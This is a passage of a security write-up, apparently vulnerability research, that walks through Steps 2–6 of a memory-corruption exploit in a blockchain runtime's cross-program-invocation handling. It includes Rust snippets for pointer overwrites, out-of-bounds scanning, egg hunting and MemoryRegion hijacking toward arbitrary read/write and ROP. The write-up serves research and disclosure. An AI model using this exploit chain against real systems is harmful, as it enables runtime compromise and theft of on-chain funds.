</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">realloc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span></code></div></div></pre>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 2: Fake Pointer Setup</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Then we want to overwrite SWAP&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountInfo.data</code> pointer with <strong class="font-semibold text-white">LEVERAGE</strong>&#x27;s data pointer. This will cause the runtime to extract <strong class="font-semibold text-white">LEVERAGE</strong>&#x27;s data address when retrieving <strong class="font-semibold text-white">SWAP</strong>&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">vm_data_addr</code> during CPI.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    </span><span class="token token" style="color:#e2777a">ptr</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">copy</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>        </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>        </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>        </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">size_of</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>    </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 3: Vulnerability Trigger via CPI</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Now we trigger the flawed <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">update_caller_account()</code> logic by initiating a CPI call doing nothing but with the corrupted <strong class="font-semibold text-white">SWAP</strong> account.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#f08d49">invoke_signed</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Instruction</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new_with_bincode</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>        </span><span class="token token" style="color:#67cdcc">*</span><span>program_id</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>        </span><span class="token token" style="color:#7ec699">b&quot;&quot;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>        </span><span class="token token macro" style="color:#f8c555">vec!</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new</span><span class="token token" style="color:#ccc">(</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>key</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>    </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>    </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span></span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">During this CPI call, the runtime builds a <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">CallerAccount</code> for <strong class="font-semibold text-white">SWAP</strong> using the malformed <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">vm_data_addr</code>. Later when CPI returns, it starts the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> update process, but instead of finding <strong class="font-semibold text-white">SWAP</strong>&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code>, it locates <strong class="font-semibold text-white">LEVERAGE</strong>&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> and updates <strong class="font-semibold text-white">LEVERAGE</strong>&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion.host_addr</code> to point to <strong class="font-semibold text-white">SWAP</strong>&#x27;s buffer.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 4: Size Mismatch to OOB</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Next, we expand <strong class="font-semibold text-white">LEVERAGE</strong> to create the size mismatch.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#999">// Resize LEVERAGE back to a larger size for memory scanning</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">realloc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">0xa00000</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">So when we access <strong class="font-semibold text-white">LEVERAGE</strong> beyond <strong class="font-semibold text-white">SWAP</strong>&#x27;s buffer size, we get out-of-bounds access to host memory.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 5: Egg Hunting for <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code></h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">With the out-of-bounds read/write, we can now hunt for the <strong class="font-semibold text-white">POINTER</strong> account&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> structure in host memory.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">let</span><span> leverage_data </span><span class="token token" style="color:#67cdcc">=</span><span> accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span></span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> scan_ptr </span><span class="token token" style="color:#67cdcc">=</span><span> leverage_data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">add</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">0x2840</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>  </span><span class="token token" style="color:#999">// Start OOB scanning</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span></span><span class="token token" style="color:#cc99cd">loop</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> check_ptr </span><span class="token token" style="color:#67cdcc">=</span><span> scan_ptr </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span>    
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    </span><span class="token token" style="color:#999">// Signature matching for MemoryRegion array</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>check_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x18</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x000000040020a238</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>       </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>check_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x58</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x0000000400202908</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span>       </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>check_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x98</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x000000040020f308</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span>       </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>check_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0xd8</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x0000000400000000</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span><span>        </span><span class="token token" style="color:#999">// Bingo!</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">15</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">16</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">We do a really simple signature matching here to locate the <strong class="font-semibold text-white">POINTER</strong> <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code>. Since the VM memory layout is fixed, the pointer fields inside <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> for specific indices of input accounts are also fixed, so we can just hardcode these VM layout pointers as our signature.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 6: Arbitrary R/W via MemoryRegion Hijacking</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Once we&#x27;ve successfully hunted down the target <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code>, we can overwrite the <strong class="font-semibold text-white">POINTER</strong> account&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion.host_addr</code> and set its state to writable to achieve arbitrary memory access. For example, we can calculate the thread memory base and hijack return addresses with ROP gadgets.</p>
